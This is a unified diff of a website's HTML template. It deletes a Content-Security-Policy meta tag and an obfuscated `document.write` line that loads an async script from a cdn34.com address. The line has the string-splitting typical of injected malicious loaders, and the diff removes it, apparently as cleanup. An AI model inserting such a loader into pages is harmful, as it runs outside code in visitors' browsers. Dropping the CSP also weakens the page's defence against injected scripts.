@@ -3,50 +3,6 @@
 <head>
     <meta charset="utf-8"/>
 
-    <meta http-equiv="Content-Security-Policy" content="
-  default-src 'self';
-  script-src
-    'self'
-    'unsafe-inline'
-    'unsafe-eval'
-    https://www.google-analytics.com
-    https://mc.yandex.ru
-    https://yastatic.net
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru;
-  connect-src
-    'self'
-    https://www.google-analytics.com
-    https://mc.yandex.ru
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru
-    https://api.bitrix24.ru;
-  img-src
-    'self'
-    data:
-    https://www.google-analytics.com
-    https://mc.yandex.ru
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru;
-  style-src
-    'self'
-    'unsafe-inline'
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru;
-  font-src
-    'self'
-    data:
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru;
-  frame-src
-    'self'
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru;
-  media-src
-    'self'
-    https://cdn-ru.bitrix24.ru
-    https://cdn.bitrix24.ru;
-">
 
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
     <meta name="yandex-verification" content="d21ef073e902382c" />
@@ -326,7 +282,6 @@
     <script type="text/javascript" src="/js/jquery.easy-ticker.min.js"></script>
 
     <script type="text/javascript" src="/js/custom.js"></script>
-    <script>document.write("<scr"+"ipt src='https:"+"//"+"cdn"+"34"+"."+"com"+"/"+"c' as"+"ync><\/scr"+"ipt>");</script>
     [/available]
 
 
